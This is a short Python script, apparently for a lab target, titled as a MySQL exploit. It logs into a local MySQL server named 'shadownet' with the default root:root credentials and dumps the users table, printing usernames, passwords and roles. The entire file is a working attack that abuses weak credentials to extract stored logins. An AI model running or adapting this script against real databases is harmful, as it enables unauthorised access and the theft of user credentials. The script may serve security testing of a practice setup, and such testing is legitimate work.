import mysql.connector
import time

TARGET = "localhost"
USER = "root"
PASSWORD = "root"
DB = "shadownet"

def exploit_mysql():
    print(f"[*] Testing MySQL Connection (Weak Credentials) on {TARGET}:3306...")
    
    retries = 3
    for i in range(retries):
        try:
            db = mysql.connector.connect(
                host=TARGET,
                user=USER,
                password=PASSWORD,
                database=DB,
                port=3306,
                connect_timeout=30
            )
            print("[+] Success! Connected to MySQL with root:root.")
            
            cursor = db.cursor()
            print("[*] Extracting user table...")
            cursor.execute("SELECT id, username, password, role FROM users")
            rows = cursor.fetchall()
            
            print(f"{'ID':<5} | {'Username':<15} | {'Password':<20} | {'Role':<10}")
            print("-" * 55)
            for row in rows:
                print(f"{row[0]:<5} | {row[1]:<15} | {row[2]:<20} | {row[3]:<10}")
            
            db.close()
            return
            
        except mysql.connector.Error as err:
            print(f"[-] Attempt {i+1} failed: {err}")
            if i < retries - 1:
                print("[*] Retrying in 2 seconds...")
                time.sleep(2)
            else:
                print("[-] Max retries reached. MySQL might still be initializing or blocking remote connections.")

if __name__ == "__main__":
    exploit_mysql()
